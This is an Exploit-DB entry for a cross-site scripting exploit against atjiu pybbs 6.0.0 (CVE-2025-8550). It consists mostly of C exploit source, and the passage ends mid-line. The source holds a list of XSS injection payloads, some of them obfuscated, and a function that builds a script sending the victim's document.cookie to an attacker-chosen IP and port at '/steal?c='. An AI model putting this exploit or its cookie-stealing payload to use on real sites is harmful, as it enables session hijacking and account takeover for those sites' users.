---
title: [webapps] atjiu pybbs 6.0.0 - Cross Site Scripting (XSS)
url: https://www.exploit-db.com/exploits/52400
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:11.274670
---

# [webapps] atjiu pybbs 6.0.0 - Cross Site Scripting (XSS)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# atjiu pybbs 6.0.0 - Cross Site Scripting (XSS)

#### EDB-ID:

###### 52400

#### CVE:

###### [2025-8550](https://nvd.nist.gov/vuln/detail/CVE-2025-8550)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
/*
 * Exploit Title : atjiu pybbs 6.0.0 - Cross Site Scripting (XSS)
 * Exploit Author: Byte Reaper
 * Vendor Homepage: https://github.com/atjiu/pybbs
 * Tested on: Kali Linux
 * CVE: CVE-2025-8550
 * ------------------------------------------------------------------------------------------------------------------------------------
 */

#include <stdio.h>
#include <curl/curl.h>
#include <pthread.h>
#include <string.h>
#include <stdlib.h>
#include "argparse.h"
#include <time.h>
#include <dirent.h>
#include <unistd.h>
#include <ctype.h>
#include <arpa/inet.h>

#define FULL_URL 3500
#define FULL_PAYLOAD_URL 9000
#define BUFFER_SIZE  6000
int selCookie = 0;
const char *cookies = NULL;
const char *baseurl = NULL;
const char *nameFileC= NULL;
int cookiesPayload = 0;
const char *ip = NULL;
int port = 0;
int verbose = 0;

int serchServer_alt()
{
    printf("\e[0;35m============================================ [SEARCH PROCESS] ============================================\e[0m\n");

    const char *nameProcess[] =
    {
        "python",
        "apache2",
        "python3",
        "mysql",
        NULL

    };
    DIR *d = opendir("/proc");
    if (!d) return 1;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL)
    {
        if (!isdigit(entry->d_name[0])) continue;
        char cmdpath[256];
        snprintf(cmdpath, sizeof(cmdpath), "/proc/%s/comm", entry->d_name);
        FILE *f = fopen(cmdpath, "r");
        if (!f) continue;
        char comm[256];
        if (fgets(comm, sizeof(comm), f))
        {
            for (int i = 0; nameProcess[i]; i++)
            {
                if (strstr(comm, nameProcess[i]))
                {
                    printf("\e[0;34m[+] Process found: %s (PID: %s)\e[0m\n", nameProcess[i], entry->d_name);
                    closedir(d);
                    return 0;
                }
            }
        }
        fclose(f);
    }
    closedir(d);
    return 1;
    printf("\e[0;35m==========================================================================================================\e[0m\n");
}
void exitSyscall()
{
    __asm__ volatile
    (
        "mov $0x3C, %%rax\n\t"
        "xor %%rdi, %%rdi\n\t"
        "syscall\n\t"
        :
        :
        :"rax", "rdi"
    );
}

int checkLen(int len, char *buf, size_t bufcap)
{
    if (len < 0 || (size_t)len >= bufcap)
    {
        printf("\e[0;31m[-] Len is Long ! \e[0m\n");
        printf("\e[0;31m[-] Len %d\e[0m\n", len);
        exitSyscall();
        return 1;
    }
    else
    {
        printf("\e[0;34m[+] Len Is Not Long (%d).\e[0m\n",len);
        return 0;

    }
    return 0;
}
void nanoSleep(void)
{
    struct timespec ob;
    ob.tv_sec = 0;
    ob.tv_nsec = 500 * 1000 * 1000;

    __asm__ volatile
    (
    "mov $230, %%rax\n\t"
    "mov $1, %%rdi\n\t"
    "xor %%rsi, %%rsi\n\t"
    "mov %0, %%rdx\n\t"
    "xor %%r10, %%r10\n\t"
    "syscall\n\t"
    :
    : "r"(&ob)
    : "rax",
      "rdi",
      "rsi",
      "rdx",
      "r10",
      "memory"
    );
}

const char *payloads[] =
{
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"#\" onclick=\"alert(1)\">click</a>",
    "<math><mi xlink:href=\"javascript:alert(1)\">XSS</mi></math>",
    "<svg><script>alert(1)</script></svg>",
    "\"><iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<img src=\"x\" onerror=\"javascript:alert(1)\">",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>Function('al'+'ert(1)')()</script>",
    "<script>(([]+[])[+[]]+([][[]]+[])[+!+[]])[1]+''[1]</script>",
    "<object data=\"javascript:alert(1)\"></object>",
    "<video><source onerror=\"alert(1)\"></video>",
    "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
    "<form onformdata=alert(1)><input></form>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
    "javascript:alert`1`",
    "javas&#x63;ript:alert(1)",
    "<script src=data:text/javascript,alert(1)></script>",
    NULL
};

const char *wordPayloadXss[] =
{
    "<script>",
    "onerror=",
    "onload=",
    "alert(",
    "javascript:",
    "<svg",
    "fetch(",
    "document.cookie",
    "srcdoc=",
    NULL
};

struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr,
                size_t size,
                size_t nmemb,
                void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitSyscall();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}

void cookieSend(const char *ipServer, int portY, const char *urlCP)
{
    CURL *curl = curl_easy_init();
    CURLcode  res;
    struct Mem responsePayload ;
    responsePayload.buffer = NULL;
    responsePayload.len = 0;
    printf("\e[0;35m================================================================ [COOKIE PAYLOAD] ================================================================\e[0m\n");

    if (curl == NULL)
    {
        printf("\e[0;31m[-] Error Create Object CURL !\e[0m\n");
        exitSyscall();
    }

    if (curl)
    {
        char full[FULL_PAYLOAD_URL];
        if (!port)
        {
            portY = 80;
            printf("\e[0;34m[+] Default Port -> %d\e[0m\n", portY);
        }
        unsigned long format;
        format = inet_addr(ipServer);
        if (format == INADDR_NONE)
        {
            printf("\e[0;31m[-] Invalid IP address string.\e[0m\n");
            exitSyscall();
        }
        else
        {
            printf("\e[0;34m[+] IP ADDRESS : %s\e[0m\n", ipServer);
        }
        char server[BUFFER_SIZE];
        if (!server)
        {
            fprintf(stderr, "\e[0;31m[-] Error allocating memory!\e[0m\n");
            exitSyscall();
        }

        int lenS = snprintf(server, BUFFER_SIZE, "<script>new Image().src='http://%s:%d/steal?c='+encodeURIComponent(document.cookie);</script>", ipServer, portY);

        if (checkLen(lenS, server, BUFFER_SIZE) == 1)
        {
            printf("[-] Error write base url in FULL URL !\e[0m\n");
            exitSyscall();
        }
        printf("\e[0;34m[+] Write Your IP And Port successfully in  Payload.\e[0m\n");
        printf("\e[0;34m[+] Full Payload Format steals cookies : %s\e[0m\n", server);
        char *encodePayloadCookie = curl_easy_escape(curl, server, strlen(server));
        if (!encodePayloadCookie)
        {
            printf("\e[0;31m[-] Error Encode Payload !\n");
            exitSyscall();
        }

        printf("[+] Encode Payload : %s\n", encodePayloadCookie);
        int lenSC = snprintf(full, FULL_PAYLOAD_URL...